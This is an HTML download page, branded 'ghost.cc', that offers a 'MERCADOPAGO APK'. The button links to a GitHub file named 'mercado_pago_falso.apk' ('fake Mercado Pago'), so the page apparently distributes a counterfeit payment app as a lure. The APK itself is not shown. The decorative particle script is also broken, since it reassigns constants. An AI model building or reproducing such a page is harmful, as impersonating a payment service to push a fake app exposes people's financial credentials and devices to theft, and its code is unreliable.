<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Descarga - ghost.cc</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            position: relative;
        }
        .container {
            text-align: center;
            position: relative;
            z-index: 2;
        }
        .logo {
            font-size: 3rem;
            margin-bottom: 20px;
            animation: glow 1.5s infinite alternate;
        }
        @keyframes glow {
            from {
                text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 15px #0f0, 0 0 20px #0f0, 0 0 25px #0f0, 0 0 30px #0f0, 0 0 35px #0f0;
            }
            to {
                text-shadow: 0 0 10px #0f0, 0 0 20px #0f0, 0 0 30px #0f0, 0 0 40px #0f0, 0 0 50px #0f0, 0 0 60px #0f0, 0 0 70px #0f0;
            }
        }
        .button {
            padding: 15px 30px;
            border: none;
            border-radius: 4px;
            background: #0f0;
            color: #000;
            font-size: 1.5rem;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .button:hover {
            background: #0c0;
        }
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ghost.cc</div>
        <div>
            <h1>MERCADOPAGO APK</h1>
            <a href="https://github.com/matulsd/mercadopagop/raw/main/mercado_pago_falso.apk" class="button" download="mercado_pago_falso.apk">Descargar APK</a>
        </div>
    </div>
    <canvas class="particles"></canvas>
    <script>
        const canvas = document.querySelector('.particles');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        function createParticles(e) {
            const xPos = e.x;
            const yPos = e.y;
            for (let i = 0; i < 100; i++) {
                const size = Math.random() * 5;
                const x = xPos + (Math.random() - 0.5) * 50;
                const y = yPos + (Math.random() - 0.5) * 50;
                const speedX = (Math.random() - 0.5) * 2;
                const speedY = (Math.random() - 0.5) * 2;
                ctx.fillStyle = '#0f0';
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI * 2);
                ctx.fill();
                ctx.closePath();
                const interval = setInterval(() => {
                    ctx.clearRect(x - size, y - size, size * 2, size * 2);
                    ctx.beginPath();
                    ctx.arc(x, y, size, 0, Math.PI * 2);
                    ctx.fill();
                    ctx.closePath();
                    x += speedX;
                    y += speedY;
                    size -= 0.1;
                    if (size <= 0) {
                        clearInterval(interval);
                    }
                }, 30);
            }
        }
        
        window.addEventListener('mousemove', createParticles);
    </script>
</body>
</html>
